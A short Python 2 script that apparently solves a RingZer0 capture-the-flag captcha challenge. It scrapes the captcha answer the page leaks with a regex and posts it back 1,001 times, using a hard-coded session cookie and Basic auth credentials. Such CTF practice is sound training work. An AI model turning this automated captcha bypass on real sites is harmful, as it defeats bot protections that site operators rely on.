'''
Created on 2015-11-21
http://ringzer0team.com/challenges/138
@author: wenhuizone
'''
import urllib,urllib2,re;
opener = urllib2.build_opener();
opener.addheaders.append(('Cookie','_ga=GA1.2.826278739.1431484996; _gat=1; PHPSESSID=416deutqr9s0fs8l2rjnk86hl7'));
opener.addheaders.append(('Authorization','Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='));
opener.addheaders.append(('Connection','keep-alive'));
opener.addheaders.append(('Referer','http://captcha.ringzer0team.com:7421/captcha1.php'));

for i in range(1001):
    try:
        f1 = opener.open("http://captcha.ringzer0team.com:7421/form1.php");
        f = f1.read();
        f1.close();
        f2 = opener.open("http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new");
        f2.close();
        r1 = re.compile('== \".*\"');
        captcha = re.findall(r1,f);
        captcha_s = captcha[0].strip('= \"');
#        print captcha_s;
        values={'captcha':captcha_s};
        data = urllib.urlencode(values);
        print data;
        try:
            response = opener.open("http://captcha.ringzer0team.com:7421/captcha1.php", data);
            print response.read();
            response.close();
        except urllib2.URLError,e:
            print e.reason;
    except urllib2.URLError,e:
        print e.reason;